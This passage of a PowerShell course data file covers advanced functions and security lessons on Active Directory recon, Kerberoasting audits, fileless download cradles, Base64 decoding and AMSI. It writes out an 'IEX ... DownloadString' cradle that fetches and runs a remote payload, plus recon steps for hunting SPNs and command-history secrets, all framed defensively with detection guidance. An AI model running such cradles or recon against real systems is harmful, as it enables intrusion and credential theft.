        cause: '`Get-Service` emits a non-terminating error by default, so PowerShell prints red text and skips the `catch` block completely.',
        fix: 'Add `-ErrorAction Stop` (`Get-Service NonExistentService -ErrorAction Stop`).',
      },
    ],
    tryItYourself: [
      'Run `try { Get-Item C:\\NoSuchFile.txt } catch { "Caught!" }` (notice `Caught!` does NOT run!), and then add `-ErrorAction Stop` (`try { Get-Item C:\\NoSuchFile.txt -ErrorAction Stop } catch { "Caught!" }`) and watch `Caught!` trigger immediately!',
      'Create `$p = @{ Name = "explorer"; ErrorAction = "SilentlyContinue" }` and run `Get-Process @p`.',
    ],
    knowledgeCheck: [
      {
        question: 'Why must you add `-ErrorAction Stop` to a cmdlet inside a `try { ... }` block?',
        options: [
          'To make the cmdlet run faster',
          'Because cmdlets emit non-terminating errors by default, which do not trigger the catch block unless converted to terminating errors with -ErrorAction Stop',
          'Because try blocks do not allow parameters',
          'To delete the error log',
        ],
        correctIndex: 1,
        explanation: 'try/catch only intercepts terminating exceptions; -ErrorAction Stop promotes non-terminating cmdlet errors into terminating errors.',
      },
      {
        question: 'If you define a hashtable `$ruleParams = @{ DisplayName = "Allow Portal"; Direction = "Inbound" }`, how do you splat it onto `New-NetFirewallRule`?',
        options: [
          'New-NetFirewallRule $ruleParams',
          'New-NetFirewallRule @ruleParams',
          'New-NetFirewallRule &ruleParams',
          'New-NetFirewallRule %ruleParams',
        ],
        correctIndex: 1,
        explanation: 'Parameter splatting uses the @ symbol (@ruleParams) to unpack hashtable keys and values as named cmdlet parameters.',
      },
    ],
  },

  {
    id: '14-2',
    chapterId: 'chapter-14',
    slug: 'advanced-functions-toolmaking',
    title: 'Reusable Functions & Advanced Toolmaking with [CmdletBinding()]',
    subtitle: 'Turn your functions into first-class cmdlets that support -Verbose, -WhatIf, and streaming pipeline input',
    estimatedMinutes: 30,
    oneSentenceSummary:
      'Adding `[CmdletBinding(SupportsShouldProcess)]`, `[Parameter(Mandatory, ValueFromPipeline)]`, and `begin / process / end` blocks upgrades a simple function into an Advanced Function that gains the common parameters (`-Verbose`, `-ErrorAction`, `-WhatIf`) and streams pipeline input, much like a compiled cmdlet.',
    summary:
      'In this lesson, you graduate from "script writer" to **Toolmaker**. We start with basic reusable functions and comment-based help (`.SYNOPSIS`, `.EXAMPLE` so `Get-Help` works on your own code!), and then upgrade them into **Advanced Functions** using `[CmdletBinding()]` - unlocking automatic `-Verbose`, `-ErrorAction`, `-WhatIf` support, parameter validation (`[ValidateSet()]`), and real streaming pipeline input (`process { }`).',
    whyItMatters:
      'When you build tools for your team or package your own PowerShell module, writing Advanced Functions with `[CmdletBinding()]` means anyone can pipe objects into your function, run `Get-Help Your-Function -Examples`, or test it with `-WhatIf`!',
    learningObjectives: [
      'Write functions named with approved `Verb-SingularNoun` conventions and include Comment-Based Help (`.SYNOPSIS`, `.DESCRIPTION`, `.EXAMPLE`)',
      'Upgrade a function to an Advanced Function using `[CmdletBinding(SupportsShouldProcess)]` and `param(...)`',
      'Decorate parameters with `[Parameter(Mandatory, ValueFromPipeline, ValueFromPipelineByPropertyName)]` and `[ValidateSet()]`',
      'Explain how `begin { }`, `process { }` (runs once per piped object!), and `end { }` blocks process streaming pipeline input',
    ],
    keyTerms: [
      'Comment-Based Help (.SYNOPSIS, .EXAMPLE)',
      '[CmdletBinding(SupportsShouldProcess)]',
      '[Parameter(Mandatory, ValueFromPipeline)]',
      '[ValidateSet()] & [ValidateNotNullOrEmpty()]',
      'begin / process / end Blocks',
      '$PSCmdlet.ShouldProcess()',
    ],
    conceptSections: [
      {
        heading: 'From Basic Function to Self-Documented Tool (Comment-Based Help)',
        body: [
          'Always name your functions using Microsoft’s `ApprovedVerb-SingularNoun` rule (`Get-ServerSummary`, `Test-PortHealth`). Even better, if you place a comment block `<# .SYNOPSIS ... .EXAMPLE ... #>` inside your function, **PowerShell’s built-in `Get-Help` command automatically parses it** so anyone on your team can run `Get-Help Get-ServerSummary -Examples`!',
        ],
      },
      {
        heading: 'The Magic of [CmdletBinding()] and Parameter Validation',
        body: [
          'Placing **`[CmdletBinding()]`** right above `param(...)` transforms a simple function into an **Advanced Function**:\n• Automatically gives your function every common parameter (`-Verbose`, `-Debug`, `-ErrorAction`, `-WarningAction`).\n• Adding **`[CmdletBinding(SupportsShouldProcess)]`** unlocks **`-WhatIf`** and **`-Confirm`** inside your function (checked via `if ($PSCmdlet.ShouldProcess($target, "Action")) { ... }`)!\n• Inside `param(...)`, you can add attributes like:\n  - **`[Parameter(Mandatory = $true, ValueFromPipeline = $true)]`** - Prompts the user if omitted AND accepts piped input!\n  - **`[ValidateSet("Dev", "Staging", "Prod")]`** - Restricts values to that exact list and gives free `Tab` auto-completion!',
        ],
      },
      {
        heading: 'Handling the Pipeline: begin { }, process { }, and end { }',
        body: [
          'If someone pipes 50 server names into your function (`"SRV01", "SRV02" | Get-ServerSummary`), a normal function without a `process` block only processes the *last* item! Advanced functions use three lifecycle blocks:\n• **`begin { }`:** Runs **once** at the very start before the first object arrives (great for headers or database connections).\n• **`process { }`:** Runs **once for every single object** coming down the pipeline conveyor belt!\n• **`end { }`:** Runs **once** after the last object has finished.',
        ],
      },
    ],
    calloutNotes: [
      {
        type: 'key',
        title: 'The One-Sentence Version',
        body: '`[CmdletBinding()]` unlocks `-Verbose`, `-Debug` and `-ErrorAction`; `ValueFromPipeline` inside a `process { }` block lets your function stream objects from the pipe; and `SupportsShouldProcess` unlocks `-WhatIf` and `-Confirm` for the line you wrap in `$PSCmdlet.ShouldProcess()`.',
      },
      {
        type: 'try',
        title: 'Tab-Complete Your Own [ValidateSet()] Parameter!',
        body: 'When you add `[ValidateSet("Domain", "Private", "Public")][string]$NetworkProfile` to your function’s `param()` block, PowerShell automatically Tab-completes `"Domain"`, `"Private"`, and `"Public"` on the command line! (Avoid naming it `$Profile`, which is an automatic variable.)',
      },
      {
        type: 'gotcha',
        title: 'Why ValueFromPipeline Needs a process { } Block',
        body: 'Without a `process { ... }` block, your function body is treated as an `end { }` block, which only sees the very last item from the pipeline! Always wrap pipeline processing logic inside `process { }`.',
      },
    ],
    commandBreakdowns: [
      {
        cmdlet: 'Write-Verbose',
        aliases: [],
        syntax: 'Write-Verbose [-Message] <String>',
        parameters: [
          {
            name: '-Message',
            type: 'String',
            description: 'Prints diagnostic trace output ONLY when the caller passes -Verbose to your [CmdletBinding()] function.',
          },
        ],
        examples: ['Write-Verbose "Connecting to $ComputerName..."'],
      },
    ],
    codeExamples: [
      {
        title: 'A Complete Enterprise Advanced Function with [CmdletBinding()], Pipeline Input & -WhatIf',
        description: 'Build an advanced function with Comment-Based Help, parameter validation, pipeline streaming, and -WhatIf support. The real Restart-Service call sits inside ShouldProcess, so -WhatIf prints what would happen and changes nothing. Try it on a lab VM.',
        code: `function Restart-LabService {
  <#
    .SYNOPSIS
    Restarts one or more allowed services, with -Verbose, -WhatIf and -Confirm support.
    .EXAMPLE
    'Spooler', 'BITS' | Restart-LabService -WhatIf
  #>
  [CmdletBinding(SupportsShouldProcess = $true, ConfirmImpact = 'Medium')]
  param (
    [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true)]
    [ValidateSet('Spooler', 'BITS')]   # only these services can be restarted by this tool
    [string]$Name
  )

  begin {
    Write-Verbose 'Starting service maintenance...'
  }

  process {
    Write-Verbose "Inspecting service: $Name"
    # ShouldProcess guards the action that CHANGES something
    if ($PSCmdlet.ShouldProcess($Name, 'Restart-Service')) {
      Restart-Service -Name $Name -ErrorAction Stop
      Get-Service -Name $Name | Select-Object Name, Status, StartType
    }
  }

  end {
    Write-Verbose 'Completed service maintenance batch.'
  }
}

# Test pipeline streaming, -Verbose, and the -WhatIf dry run first (nothing is restarted)
'Spooler', 'BITS' | Restart-LabService -Verbose -WhatIf
# When the preview looks right, drop -WhatIf (lab VM only):
# 'Spooler', 'BITS' | Restart-LabService -Verbose`,
        output: `VERBOSE: Starting service maintenance...
VERBOSE: Inspecting service: Spooler
What if: Performing the operation "Restart-Service" on target "Spooler".
VERBOSE: Inspecting service: BITS
What if: Performing the operation "Restart-Service" on target "BITS".
VERBOSE: Completed service maintenance batch.`,
      },
    ],
    mistakesAndTraps: [
      {
        mistake: 'Using `Write-Host "Debug info"` inside an advanced function instead of `Write-Verbose "Debug info"`.',
        cause: '`Write-Host` prints noisy text every time, whereas `Write-Verbose` stays quiet by default and only prints when the user asks for `-Verbose`.',
        fix: 'Use `Write-Verbose` inside `[CmdletBinding()]` functions.',
      },
      {
        mistake: 'Putting a read-only command (like `Get-Service`) inside `ShouldProcess` and calling the function "safe".',
        cause: '`ShouldProcess` is meant to guard the line that **changes** something. Wrapping a harmless read teaches the pattern backwards and the message ("Restart-Service") would not match what really runs.',
        fix: 'Put the real changing cmdlet (here `Restart-Service`) inside `if ($PSCmdlet.ShouldProcess(target, action)) { ... }` and make the action text match it.',
      },
      {
        mistake: 'Naming a parameter `$Profile` (or `$Host`, `$Error`, `$Input`, `$PWD`).',
        cause: 'These are automatic variables. `$PROFILE` is the path of your profile script, so your parameter can collide with it and confuse readers.',
        fix: 'Pick a different name such as `$NetworkProfile` or `$Tier`.',
      },
    ],
    tryItYourself: [
      'Copy the `Restart-LabService` function into your console and run `Get-Help Restart-LabService -Examples` to see your own Comment-Based Help rendered like a native cmdlet. Then run it with `-WhatIf` only.',
      'Try passing `-Name Dnscache` to see `[ValidateSet()]` automatically block a service that is not in the allowed list.',
    ],
    knowledgeCheck: [
      {
        question: 'In an Advanced Function that accepts pipeline input (`ValueFromPipeline = $true`), which block executes once for EVERY object piped into the function?',
        options: ['begin { }', 'process { }', 'end { }', 'param ( )'],
        correctIndex: 1,
        explanation: 'begin runs once before pipeline input starts, process runs once for each incoming pipeline object, and end runs once after all objects are processed.',
      },
      {
        question: 'Which attribute on `[CmdletBinding(...)]` unlocks built-in `-WhatIf` and `-Confirm` support for your custom function?',
        options: [
          'SupportsShouldProcess = $true',
          'EnableWhatIf = $true',
          'AllowSimulation = $true',
          'SafeMode = $true',
        ],
        correctIndex: 0,
        explanation: '[CmdletBinding(SupportsShouldProcess = $true)] paired with $PSCmdlet.ShouldProcess() adds native -WhatIf and -Confirm parameters to your function.',
      },
    ],
  },

  // ==========================================================================
  // CHAPTER 15: POWERSHELL FOR ETHICAL HACKERS & OFFENSIVE SECURITY
  // ==========================================================================
  {
    id: '15-1',
    chapterId: 'chapter-15',
    slug: 'offensive-recon-and-ad-enum',
    title: 'Ethical Hacking Recon: Local Situational Awareness & Native ADSI Domain Hunting',
    subtitle: 'Enumerate privileges, unquoted service paths, open ports, and Active Directory SPNs without installing a single external tool',
    estimatedMinutes: 35,
    oneSentenceSummary:
      'Defenders and authorized red teamers "Live Off the Land" using built-in PowerShell and `.NET` classes (`[adsisearcher]`) to enumerate local escalation paths, list listening ports, and discover Kerberoastable Active Directory accounts without installing any third-party tools, and defenders learn which log events reveal each step.',
    summary:
      'Welcome to Track 4! Why is PowerShell so central to both Red Team engagements and Blue Team incident response? Because it is pre-installed on every Windows machine and has full access to `.NET` and WMI/CIM, a technique security pros call **Living Off the Land (LOTL / LOLBins)**. In this lesson, we put on an auditor’s hat to perform local privilege-escalation recon (token privileges, unquoted service paths, listening ports) and enumerate Active Directory Domain Admins and Kerberoastable Service Principal Names (SPNs) using native `.NET [adsisearcher]` - even on a workstation that doesn’t have the RSAT `ActiveDirectory` module installed. Every technique is paired with the event or alert that detects it. **Authorised use only: lab VMs or systems you have written permission to test.**',
    whyItMatters:
      'You cannot defend an Active Directory forest until you see how easily an attacker who lands on a single standard-user workstation can map your domain and find misconfigured service accounts in seconds using built-in `.NET` classes, and until you know which log events and alerts catch it.',
    learningObjectives: [
      'Perform local Situational Awareness & Privilege Escalation recon (checking `whoami /priv`, local admins, listening TCP connections, and Unquoted Service Paths)',
      'Explain why attackers use native `.NET [adsisearcher]` (`System.DirectoryServices.DirectorySearcher`) when the RSAT `ActiveDirectory` module is not installed',
      'Query Active Directory for privileged groups and accounts with `ServicePrincipalName` (SPN) values to audit **Kerberoasting** exposure',
      'Audit file and registry permissions using `Get-Acl` to spot weak ACLs on service binaries',
    ],
    keyTerms: [
      'Living Off the Land (LOTL / LOLBins)',
      'Unquoted Service Path Vulnerability',
      '[adsisearcher] (Native .NET LDAP Searcher)',
      'Service Principal Name (SPN)',
      'Kerberoasting (T1558.003)',
      'Get-Acl (Access Control List Audit)',
    ],
    conceptSections: [
      {
        heading: 'Local Situational Awareness & Finding Unquoted Service Paths',
        body: [
          '**Authorised use only.** Run everything in this chapter only on your own lab VMs (`CLIENT01`, `SRV-CORE01`, `DC01`; Lab setup: see the Lab Setup page) or on systems where you hold written permission. Read the authorisation box below before you start.',
          'When an authorized assessor (or a defender auditing their own estate) has command-line access to a Windows machine, the built-in tools are enough to answer four questions. That is exactly why defenders must be able to see and baseline them:\n1. **Who am I and what token privileges do I hold?** (`whoami /all` - looking for dangerous privileges like `SeImpersonatePrivilege` or `SeDebugPrivilege`).\n2. **What services are running as `LocalSystem` with an Unquoted Service Path?**\n   If a service runs as `LocalSystem` and its executable path has spaces *without quotes* - for example, `C:\\Program Files\\Custom App\\Service Folder\\svc.exe` - Windows literally tries to execute `C:\\Program.exe`, then `C:\\Program Files\\Custom.exe`, and then `C:\\Program Files\\Custom App\\Service.exe`! If a standard user has write permission to any of those folders (`Get-Acl`), they can escalate straight to `SYSTEM`. The fix is simple: put quotes around the path, and tighten folder permissions.\n3. **What internal ports and connections are active?** (`Get-NetTCPConnection -State Listen, Established`).\n4. **Did an admin leave plain-text passwords inside PowerShell ConsoleHost history or `.xml`/`.ps1` files?**\n   Checking `(Get-PSReadLineOption).HistorySavePath` (`ConsoleHost_history.txt`) on your own lab machine shows why you must never type secrets on a command line.',
        ],
      },
      {
        heading: 'Domain Recon Without RSAT: The [adsisearcher] Superpower',
        body: [
          'Wait, in Chapter 12, we used `Get-ADUser` from the `ActiveDirectory` RSAT module. What if you land on a standard employee laptop that **does not have RSAT installed**? Can you still query Active Directory?',
          '**Yes!** Every Windows machine has `.NET` built in, and PowerShell provides the **`[adsisearcher]`** type accelerator (`System.DirectoryServices.DirectorySearcher`). Without installing a single module or requiring Admin rights, any domain user can query LDAP directly:\n• Find all members of `Domain Admins`:\n  `([adsisearcher]"(samAccountName=Domain Admins)").FindOne().Properties.member`\n• **Audit for Kerberoastable Service Accounts:**\n  In Active Directory, any user account with a non-empty **`servicePrincipalName` (SPN)** attribute can have its Kerberos service ticket (TGS) requested by *any* authenticated domain user (`(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))`). If that service account has a weak password, an attacker can crack the ticket offline (**Kerberoasting**)! Auditing SPNs with PowerShell lets you find these accounts first and enforce 25+ character passwords or Group Managed Service Accounts (gMSAs).',
        ],
      },
      {
        heading: 'Map Every Technique to Its Detection (What the Blue Team Sees)',
        body: [
          'For each thing in this lesson, there is a trace. Learn the pairs:\n• **Running PowerShell recon commands at all** (`whoami /all`, `Get-CimInstance Win32_Service`, `Get-NetTCPConnection`, `Get-Acl`, `[adsisearcher]`) -> **4104** (script block logging, `Microsoft-Windows-PowerShell/Operational`) and **4688** (process creation, `Security`; the command line is only logged when you enable the audit policy *and* the "Include command line in process creation events" setting, see 16-1).\n• **Unquoted service path exploitation** (MITRE T1574.009) -> a new file created in a writable parent folder of the service path (file-creation telemetry such as Sysmon 11) and a service starting an unexpected binary; a changed service shows as **7045** (System log) or **4697** (Security).\n• **Reading the PSReadLine history file** (T1552.001) -> 4104 for the PowerShell that reads it, plus **4663** only if you set an audit rule (SACL) on that file.\n• **LDAP/SPN enumeration with `[adsisearcher]`** (T1087.002, T1069.002) -> 4104 on the workstation. On the DC, **Event 1644 is not a reliable detector**: it is a Field Engineering diagnostic that only logs expensive queries after you raise the diagnostics level. Use identity-threat tooling (for example Microsoft Defender for Identity) or monitor 4104 centrally.\n• **Kerberoasting** (T1558.003) -> DC event **4769** (a service ticket was requested) where **Ticket Encryption Type is `0x17` (RC4)** for a user-account service, especially many requests from one account in a short time.\n• **Honey-SPN account:** create a decoy user with a fake SPN and a long random password that no real system uses. **Any 4769 for that account is a high-fidelity alert.** (Lab build only, document it and monitor it.)',
        ],
      },
    ],
    calloutNotes: [
      {
        type: 'danger',
        title: 'Authorised Use Only: Read This Before You Run Anything in Chapter 15',
        body: '1. **Written permission first.** Only test systems you own, or where the owner has given you written authorisation that names you, the targets and the dates.\n2. **Stay inside the scope.** If the paper says CLIENT01 and SRV-CORE01, do not touch anything else, and stop when the engagement ends.\n3. **The law applies.** Unauthorised access is a crime in most countries (for example the Computer Fraud and Abuse Act in the US, the Computer Misuse Act in the UK). "I was only learning" is not a defence.\n4. **Never on a work or school machine or network,** even if you "just want to check". Use only the isolated lab (`LabNet`: DC01, SRV-CORE01, CLIENT01; Lab setup: see the Lab Setup page).\n5. **Defensive goal.** The point of this chapter is to find and close weaknesses and to recognise these steps in logs.',
      },
      {
        type: 'key',
        title: 'The One-Sentence Version',
        body: 'Ethical hackers use native WMI/CIM to hunt local misconfigurations (like Unquoted Service Paths and `ConsoleHost_history.txt`) and `.NET [adsisearcher]` to enumerate Active Directory and Kerberoastable SPNs without needing RSAT.',
      },
      {
        type: 'danger',
        title: 'Ethical & Authorized Use Only',
        body: 'Every technique in this chapter is taught so you can audit your own infrastructure, succeed in authorized penetration tests and CTFs, and recognize adversary tradecraft in your SOC logs. If you are not sure you are allowed to run something, you are not.',
      },
      {
        type: 'pro',
        title: 'How to Fix Kerberoasting Exposure',
        body: 'When your audit script finds user accounts with SPNs, migrate them to **Group Managed Service Accounts (gMSAs)** (`New-ADServiceAccount`), which use 120-character random passwords managed automatically by Active Directory!',
      },
    ],
    commandBreakdowns: [
      {
        cmdlet: 'Get-NetTCPConnection',
        aliases: [],
        syntax: 'Get-NetTCPConnection [-State <State[]>] [-LocalPort <UInt16[]>]',
        parameters: [
          {
            name: '-State',
            type: 'State[]',
            description: 'Filters TCP sockets by state (Listen, Established, TimeWait) and includes the OwningProcess PID.',
          },
        ],
        examples: [
          'Get-NetTCPConnection -State Listen | Select-Object LocalAddress, LocalPort, OwningProcess',
        ],
      },
      {
        cmdlet: 'Get-Acl',
        aliases: [],
        syntax: 'Get-Acl [[-Path] <String[]>]',
        parameters: [
          {
            name: '-Path',
            type: 'String[]',
            description: 'Retrieves the security descriptor (Access Control List / permissions) of a file, folder, or registry key.',
          },
        ],
        examples: ['(Get-Acl C:\\Windows\\System32).Access'],
      },
    ],
    codeExamples: [
      {
        title: 'Ethical Hacking Recon: Unquoted Service Paths, History Files & Native [adsisearcher] SPN Hunting',
        description: 'Lab/authorised systems only. Audit a machine for Unquoted Service Paths, map listening TCP ports to process names, and find Kerberoastable SPN accounts via [adsisearcher]. Read-only: nothing is changed or exploited.',
        code: `# 1. Hunt for Unquoted Service Paths running as LocalSystem (Privilege Escalation Audit)
Get-CimInstance Win32_Service |
  Where-Object {
    $_.StartName -eq 'LocalSystem' -and
    $_.PathName -notmatch '^"' -and
    $_.PathName -notmatch '^C:\\\\Windows\\\\' -and
    $_.PathName -match ' '
  } | Select-Object Name, StartMode, State, PathName

# 2. Map all Listening TCP Ports to their live Process Name
Get-NetTCPConnection -State Listen |
  Select-Object -First 5 LocalAddress, LocalPort, OwningProcess, @{
    Name       = 'ProcessName'
    Expression = { (Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Name }
  }

# 3. Check PSReadLine command history file location (where admins often leak typed secrets!)
$historyPath = (Get-PSReadLineOption).HistorySavePath
Write-Output "PSReadLine History File: $historyPath"

# 4. Native .NET [adsisearcher] LDAP query for User Accounts with SPNs (Kerberoasting Audit - No RSAT needed!)
$searcher = [adsisearcher]"(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
# $searcher.FindAll() | ForEach-Object { $_.Properties.samaccountname }`,
        output: `LocalAddress LocalPort OwningProcess ProcessName
------------ --------- ------------- -----------
0.0.0.0            135          1024 svchost
0.0.0.0            445             4 System
0.0.0.0           5985          1892 svchost
127.0.0.1         8888          6140 python

PSReadLine History File: C:\\Users\\student\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt`,
      },
    ],
    mistakesAndTraps: [
      {
        mistake: 'Assuming that uninstalling the RSAT `ActiveDirectory` PowerShell module on workstations stops attackers from querying Active Directory.',
        cause: 'Any domain machine can use built-in `.NET [adsisearcher]` (`System.DirectoryServices.DirectorySearcher`) to run raw LDAP queries without RSAT.',
        fix: 'Do not rely on Event 1644 (a Field Engineering diagnostic, not a recon detector). Forward 4104 centrally, alert on 4769 with RC4 (`0x17`), plant a honey-SPN account, use an identity-threat tool, and harden privileged accounts and SPNs (gMSAs, long passwords).',
      },
    ],
    tryItYourself: [
      'On a lab VM only, run the Listening TCP Ports one-liner above to see which process owns every open port.',
      'Check your own lab machine’s `ConsoleHost_history.txt` path with `(Get-PSReadLineOption).HistorySavePath` to see how PSReadLine records historical commands across sessions, then ask: what secret would be dangerous to leave here?',
      'Afterwards, in the lab, open the 4104 events for what you just ran (`Get-WinEvent -FilterHashtable @{ LogName = "Microsoft-Windows-PowerShell/Operational"; Id = 4104 } -MaxEvents 5`) and see your own recon through the defender’s eyes.',
    ],
    knowledgeCheck: [
      {
        question: 'How can an ethical hacker or red teamer query Active Directory users and SPNs from a domain workstation that does NOT have the RSAT ActiveDirectory module installed?',
        options: [
          'It is impossible without RSAT',
          'By using the built-in .NET [adsisearcher] (System.DirectoryServices.DirectorySearcher) type accelerator',
          'By opening Paint',
          'By running Format-Table',
        ],
        correctIndex: 1,
        explanation: '[adsisearcher] is built into .NET on every Windows machine and executes LDAP queries directly against the Domain Controller.',
      },
      {
        question: 'What causes an "Unquoted Service Path" privilege escalation vulnerability on Windows?',
        options: [
          'A service running as LocalSystem whose executable path contains spaces (outside C:\\Windows) without surrounding quotation marks, allowing an attacker with folder write access to plant a hijacked binary',
          'A service whose name is shorter than 5 letters',
          'A service that uses HTTPS',
          'A service that is currently Stopped',
        ],
        correctIndex: 0,
        explanation: 'When a service path with spaces is unquoted (e.g., C:\\Program Files\\My Service\\app.exe), Windows sequentially tries C:\\Program.exe and C:\\Program Files\\My.exe before the full path.',
      },
    ],
  },

  {
    id: '15-2',
    chapterId: 'chapter-15',
    slug: 'in-memory-cradles-and-evasion',
    title: 'Fileless Tradecraft: In-Memory Cradles (IEX), -EncodedCommand & How AMSI Works',
    subtitle: 'Deconstruct fileless PowerShell execution, decode Base64 payloads, and trace how AMSI catches obfuscated scripts',
    estimatedMinutes: 30,
    diagramId: 'offensive-killchain-svg',
    oneSentenceSummary:
      'Attackers use In-Memory Cradles (`IEX`) and Base64 (`-EncodedCommand`) to avoid writing `.ps1` files to disk, but both leave traces for defenders: the final decoded code is handed to **AMSI (Antimalware Scan Interface)** and recorded in **Event ID 4104** right before it runs. AMSI is a valuable layer, not a guarantee, so you pair it with logging, EDR and application control.',
    summary:
      'Commands starting with `powershell.exe -nop -w hidden -enc ...` or `IEX (New-Object Net.WebClient).DownloadString(...)` show up constantly in PowerShell-related incident reports, so every SOC analyst needs to recognise them. In this lesson, we deconstruct **Fileless In-Memory Download Cradles**, learn how to safely decode `-EncodedCommand` Base64 payloads (decode and read, never execute), and see how **AMSI (Antimalware Scan Interface)** gives defenders a look at de-obfuscated code in memory, and where its limits are. Authorised use only: lab VMs or systems you have written permission to test.',
    whyItMatters:
      'When you are on call in a Security Operations Center (SOC) and an alert triggers on an `-EncodedCommand` string, you need to decode that Base64 payload safely in seconds and understand whether AMSI and Script Block Logging intercepted it.',
    learningObjectives: [
      'Deconstruct a classic **Fileless In-Memory Download Cradle** (`Invoke-Expression` / `IEX`) and explain why it avoids touching the hard drive',
      'Decode and inspect any `-EncodedCommand` (`-enc`) Base64 string using `[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(...))`',
      'Explain why `.NET` uses **UTF-16LE (`Unicode`)** encoding for PowerShell’s `-EncodedCommand` parameter',
      'Trace how **AMSI (`amsi.dll`)** sits inside the PowerShell process and can scan de-obfuscated code in memory before `IEX` executes it, and explain why it is one layer of defence in depth, not a guarantee',
    ],
    keyTerms: [
      'Fileless Malware / In-Memory Cradle',
      'Invoke-Expression (IEX)',
      '-EncodedCommand (-enc / Base64 UTF-16LE)',
      'AMSI (Antimalware Scan Interface / amsi.dll)',
      'Dynamic De-obfuscation Inspection',
    ],
    conceptSections: [
      {
        heading: 'Anatomy of an In-Memory Download Cradle (Invoke-Expression / IEX)',
        body: [
          'Traditional antivirus scanned files written to the hard drive (`C:\\Temp\\evil.exe`). To avoid disk-based scanners, attackers turned to **Fileless Execution** using **`Invoke-Expression`** (alias **`IEX`**), a cmdlet that takes any string in RAM and executes it as live PowerShell code. A classic example (shown here to be recognised, never to be run; `192.0.2.10` is a documentation-only address):\n`IEX (New-Object System.Net.WebClient).DownloadString("http://192.0.2.10/payload.ps1")`\n*(or `Invoke-RestMethod http://192.0.2.10/payload.ps1 | Invoke-Expression`)*',
          'Notice what happened: `DownloadString()` fetched the script over HTTP directly into a string in **RAM**, and `IEX` executed it straight from RAM without ever saving a `.ps1` file to the SSD! And as a defender, remember: **Legitimate production scripts almost NEVER need `Invoke-Expression` (`IEX`)** - if you see `IEX` in your logs, investigate immediately.',
        ],
      },
      {
        heading: 'Decoding -EncodedCommand (-enc): Why Base64 Is NOT Encryption',
        body: [
          'Why did Microsoft add **`-EncodedCommand`** (shortened as `-enc` or `-e`) to `powershell.exe`? To help legitimate system administrators pass complex scripts containing nested quotes and special characters across command lines without `cmd.exe` mangling the quotes!',
          'Attackers quickly abused `-EncodedCommand` thinking Base64 would hide their commands from analysts. Here is the truth:\n1. **Base64 is an encoding, NOT encryption** - there is no secret key, and any analyst can reverse it in 2 seconds.\n2. PowerShell’s `-EncodedCommand` uses **16-bit Unicode (`UTF-16LE`)**, which is why every regular ASCII letter in a PowerShell Base64 string is padded with a null byte (`0x00`), creating lots of `A` characters in the Base64 string (`SQBFAFgA...`)!\n• **How to Decode Any Suspicious `-enc` String Safely (Without Running It!):**\n  `[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("SQBFAFgA"))`',
        ],
      },
      {
        heading: 'How AMSI (Antimalware Scan Interface) Gives Defenders a Look at De-obfuscated Code (and Where It Stops)',
        body: [
          'If an attacker Base64-encodes a script, splits strings into pieces (`"In" + "voke-Mim" + "ikatz"`), and runs it entirely in RAM via `IEX`, how can Windows Defender still have a chance to catch it?',
          'Look at the **Red Team vs. Blue Team Kill-Chain SVG diagram** below! Starting in Windows 10 / Server 2016, Microsoft loads **`amsi.dll` (Antimalware Scan Interface)** into the PowerShell process.\nHowever much Base64 or string obfuscation wraps the code, **PowerShell itself has to unpack the plain-text instructions just before executing them.** At that point the script engine can hand the **decoded, plain-text buffer** to `AmsiScanBuffer()`, so an AMSI-aware antimalware product (Microsoft Defender or a third-party EDR) can inspect it before it runs.',
          '**But AMSI is not a guarantee.** It depends on the installed antimalware product and its signatures and behaviour rules, so novel or heavily modified code can slip past it. A determined attacker with enough access on the machine can also try to tamper with or bypass it, and AMSI only sees what an AMSI-aware engine submits. That is why the answer is **defence in depth**: script block logging (4104) forwarded off the host, alerts on log clearing (1102), an EDR, and application control (WDAC/AppLocker) with Constrained Language Mode (Chapter 16). Treat any AMSI block as a signal to investigate, and the absence of one as no proof of safety.',
        ],
      },
    ],
    calloutNotes: [
      {
        type: 'key',
        title: 'The One-Sentence Version',
        body: '`-EncodedCommand` is just reversible UTF-16LE Base64, and **AMSI (`amsi.dll`)** can inspect in-memory `IEX` payloads *after* decoding, but it is one layer of defence, not a guarantee.',
      },
      {
        type: 'try',
        title: 'Encode and Decode a Safe Command Right Now',
        body: 'Run the Base64 encoder/decoder example below to see why UTF-16LE Base64 strings always look like `RwBlAHQALQ...` (with capital `A`s between letters) and how to decode them in one line.',
      },
      {
        type: 'danger',
        title: 'Never Pipe Unknown Base64 Strings Into IEX!',
        body: 'When analyzing a suspicious `-EncodedCommand` from an alert, always pipe the decoded output to **`Write-Output`** or a text file, never to `IEX` or `Invoke-Expression`!',
      },
    ],
    commandBreakdowns: [
      {
        cmdlet: 'Invoke-RestMethod',
        aliases: ['irm'],
        syntax: 'Invoke-RestMethod [-Uri] <Uri> [-Method <WebRequestMethod>]',
        parameters: [
          {
            name: '-Uri',
            type: 'Uri',
            description: 'The HTTP/HTTPS URL to query (automatically parses JSON or XML responses into PowerShell objects!).',
          },
        ],
        examples: ['Invoke-RestMethod -Uri "https://api.github.com/zen"'],
      },
    ],
    codeExamples: [
      {
        title: 'Forensic Decoding of -EncodedCommand Payloads & Inspecting Loaded amsi.dll',
        description: 'Encode a command into UTF-16LE Base64, decode a suspicious -enc string safely, and verify that amsi.dll is loaded inside your PowerShell process.',
        code: `# 1. How PowerShell encodes a command for -EncodedCommand (UTF-16LE / Unicode)
$plainCommand = 'Get-Service -Name WinRM'
$bytes        = [System.Text.Encoding]::Unicode.GetBytes($plainCommand)
$encodedB64   = [System.Convert]::ToBase64String($bytes)
Write-Output "Encoded (-enc) : $encodedB64"

# 2. SOC Analyst One-Liner: Safely DECODE a suspicious -EncodedCommand string without executing it!
$decodedText  = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encodedB64))
Write-Output "Decoded Safely : $decodedText"

# 3. Verify that AMSI (amsi.dll) is loaded inside your current PowerShell process memory
(Get-Process -Id $PID).Modules |
  Where-Object ModuleName -eq 'amsi.dll' |
  Select-Object ModuleName, FileName, Size`,
        output: `Encoded (-enc) : RwBlAHQALQBTAGUAcgB2AGkAYwBlACAALQBOAGEAbQBlACAAVwBpAG4AUgBNAA==
Decoded Safely : Get-Service -Name WinRM

ModuleName FileName                        Size
